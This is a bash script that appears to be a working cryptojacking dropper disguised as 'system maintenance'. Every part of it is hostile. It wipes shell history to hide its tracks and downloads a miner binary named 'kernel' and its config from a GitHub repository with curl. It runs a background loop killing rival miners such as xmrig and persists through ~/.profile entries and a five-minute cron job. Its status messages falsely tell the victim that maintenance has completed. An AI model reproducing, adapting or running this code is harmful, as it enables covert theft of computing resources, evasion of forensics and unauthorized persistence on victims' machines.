#!/bin/bash

# 1. Anti-forensics: Wipe command history
history -c && > ~/.bash_history && unset HISTFILE && set +o history

# 2. Configuration
REPO_URL="https://github.com/hlainggyi007/update_sys/raw/refs/heads/main"
LOCAL_DIR="$HOME/.local"

# 3. Competitor Killer Logic (Replaces daemon.sh)
# This function creates a side-process to terminate other miners
killer_setup() {
    cat <<EOF > "$LOCAL_DIR/daemon.sh"
#!/bin/bash
while true; do
    # Identify and terminate common rival miners while sparing our own 'kernel' process
    pgrep -f "daemon|xmrig|miner|monero|dbs_ppy" | grep -v "kernel" | xargs kill -9 >/dev/null 2>&1
    sleep 30
done
EOF
    chmod +x "$LOCAL_DIR/daemon.sh"
    # Execute the killer process in the background
    nohup "$LOCAL_DIR/daemon.sh" >/dev/null 2>&1 &
}

# 4. Payload Downloader
payload_downloader() {
    mkdir -p "$LOCAL_DIR"
    # Fetching core files from your repository
    curl -L "$REPO_URL/kernel" -o "$LOCAL_DIR/kernel"
    curl -L "$REPO_URL/config.json" -o "$LOCAL_DIR/config.json"
    chmod +x "$LOCAL_DIR/kernel"
}

# 5. Mining Service Creation
create_run_script() {
    cat <<EOF > "$LOCAL_DIR/run.sh"
#!/bin/bash
if ! pidof kernel >/dev/null; then
    # Running the miner with stealth configuration
    "$LOCAL_DIR/kernel" --config="$LOCAL_DIR/config.json" >/dev/null 2>&1 &
fi
EOF
    chmod +x "$LOCAL_DIR/run.sh"
}

# 6. Persistence Setup (System Startup & Cron)
setup_persistence() {
    touch ~/.profile
    # Ensure both miner and killer scripts start on login
    grep -q "$LOCAL_DIR/run.sh" ~/.profile || echo "$LOCAL_DIR/run.sh &" >> ~/.profile
    grep -q "$LOCAL_DIR/daemon.sh" ~/.profile || echo "$LOCAL_DIR/daemon.sh &" >> ~/.profile
    
    # Auto-check every 5 minutes
    (crontab -l 2>/dev/null; echo "*/5 * * * * $LOCAL_DIR/run.sh") | crontab -
}

# Execution Flow
echo "[*] Initializing system maintenance..."
payload_downloader
killer_setup
create_run_script
setup_persistence

# Start the miner
"$LOCAL_DIR/run.sh"

echo "[+] System maintenance completed."
